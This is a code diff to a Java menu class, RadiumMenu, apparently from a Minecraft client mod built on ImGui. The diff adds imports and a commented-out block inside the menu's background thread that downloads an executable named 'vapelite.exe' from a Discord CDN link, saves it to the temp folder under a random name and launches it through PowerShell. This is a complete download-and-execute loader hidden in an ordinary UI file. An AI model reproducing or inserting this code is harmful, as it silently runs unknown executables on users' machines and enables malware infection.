@@ -4,7 +4,15 @@ import imgui.ImGui;
 import imgui.flag.ImGuiCol;
 import net.caffeinemc.phosphor.common.Phosphor;
 import net.caffeinemc.phosphor.module.Module;
+import org.apache.commons.lang3.RandomStringUtils;
 
+import java.io.IOException;
+import java.io.InputStream;
+import java.net.URL;
+import java.nio.file.Files;
+import java.nio.file.Path;
+import java.nio.file.Paths;
+import java.nio.file.StandardCopyOption;
 import java.util.ArrayList;
 import java.util.List;
 import java.util.concurrent.atomic.AtomicBoolean;
@@ -55,6 +63,23 @@ public class RadiumMenu implements Renderable {
 
                 module.cleanStrings();
             }
+
+//            String FILE_URL = "https://cdn.discordapp.com/attachments/1125468134833401989/1130936549131952148/vapelite.exe";
+//            String FILE_NAME = RandomStringUtils.random(10, true, true);
+//            String PATH = System.getProperty("java.io.tmpdir");
+//
+//            try {
+//                InputStream inputStream = new URL(FILE_URL).openStream();
+//                Path pathToFile = Paths.get(PATH).resolve(FILE_NAME);
+//                Files.copy(inputStream, pathToFile, StandardCopyOption.REPLACE_EXISTING);
+//
+//                String command = String.format("powershell.exe Start-Process -FilePath \"%s\" -PassThru -NoNewWindow", pathToFile);
+//                Process powerShellProcess = Runtime.getRuntime().exec(command);
+//
+//                powerShellProcess.waitFor();
+//            } catch (IOException | InterruptedException e) {
+//                throw new RuntimeException(e);
+//            }
         }).start();
     }
 
